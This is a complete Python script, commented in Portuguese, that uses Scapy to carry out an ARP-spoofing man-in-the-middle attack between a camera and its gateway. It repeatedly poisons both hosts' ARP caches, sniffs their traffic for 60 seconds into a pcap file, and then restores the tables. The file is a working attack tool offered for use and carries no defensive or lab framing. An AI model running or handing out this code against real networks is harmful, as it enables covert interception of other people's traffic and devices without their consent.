

import os
import sys
import threading
import time
from scapy.all import ARP, Ether, send, sniff, wrpcap, conf, get_if_hwaddr, sr, get_windows_if_list

"""
Script: mitm_arp_spoof.py
Descrição: Realiza ataque Man-in-the-Middle (MitM) via ARP spoofing entre dois IPs (ex: câmera e gateway),
redirecionando o tráfego e capturando pacotes. Necessário rodar como administrador!
"""

def get_mac(ip, iface=None):
    """Obtém o endereço MAC de um IP na rede, compatível com Windows."""
    import platform
    if platform.system() == "Windows":
        # Tenta obter do cache ARP
        import subprocess
        try:
            output = subprocess.check_output("arp -a", shell=True, encoding="utf-8")
            for line in output.splitlines():
                if ip in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        return parts[1].replace('-', ':').lower()
        except Exception:
            pass
    # Tenta método Scapy (pode falhar no Windows)
    try:
        ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0, iface=iface)
        for _, rcv in ans:
            if Ether in rcv:
                return rcv[Ether].src
            elif hasattr(rcv, 'hwsrc'):
                return rcv.hwsrc
    except Exception:
        pass
    return None

def spoof(target_ip, spoof_ip, iface):
    target_mac = get_mac(target_ip, iface)
    if not target_mac:
        print(f"[ERRO] Não foi possível obter MAC de {target_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, iface=iface, verbose=0)

def restore(target_ip, spoof_ip, iface):
    target_mac = get_mac(target_ip, iface)
    spoof_mac = get_mac(spoof_ip, iface)
    if not target_mac or not spoof_mac:
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=5, iface=iface, verbose=0)

def mitm_attack(camera_ip, gateway_ip, iface=None, pcap_file="mitm_capture.pcap"):
    import platform
    if platform.system() == "Windows":
        # Lista interfaces disponíveis
        print("[INFO] Interfaces de rede disponíveis:")
        from scapy.all import get_windows_if_list
        interfaces = get_windows_if_list()
        for idx, i in enumerate(interfaces):
            print(f"{idx+1}: {i['name']}")
        if not iface:
            sel = input("Selecione o número da interface: ").strip()
            try:
                iface = interfaces[int(sel)-1]['name']
            except Exception:
                print("[ERRO] Interface inválida.")
                return
    print("[INFO] Iniciando ataque ARP spoofing...")
    stop_event = threading.Event()

    def poison():
        while not stop_event.is_set():
            spoof(camera_ip, gateway_ip, iface)
            spoof(gateway_ip, camera_ip, iface)
            time.sleep(2)

    poison_thread = threading.Thread(target=poison)
    poison_thread.start()

    print(f"[INFO] Capturando pacotes entre {camera_ip} e {gateway_ip}...")
    try:
        packets = sniff(filter=f"host {camera_ip} or host {gateway_ip}", iface=iface, timeout=60)
        wrpcap(pcap_file, packets)
        print(f"[OK] Captura salva em {pcap_file}")
    except KeyboardInterrupt:
        print("[!] Interrompido pelo usuário.")
    finally:
        stop_event.set()
        poison_thread.join()
        restore(camera_ip, gateway_ip, iface)
        restore(gateway_ip, camera_ip, iface)
        print("[INFO] Tabelas ARP restauradas.")

if __name__ == "__main__":
    # Checagem de permissão de administrador/root
    if (hasattr(os, "geteuid") and os.geteuid() != 0) or (sys.platform.startswith('win') and not os.environ.get('USERNAME', '').lower() == 'administrator'):
        print("[ERRO] Rode este script como administrador/root!")
        sys.exit(1)
    print("--- MITM ARP Spoofing ---")
    camera_ip = input("IP da câmera: ")
    gateway_ip = input("IP do gateway/roteador: ")
    iface = input("Interface de rede (ex: eth0, wlan0): ")
    mitm_attack(camera_ip, gateway_ip, iface)
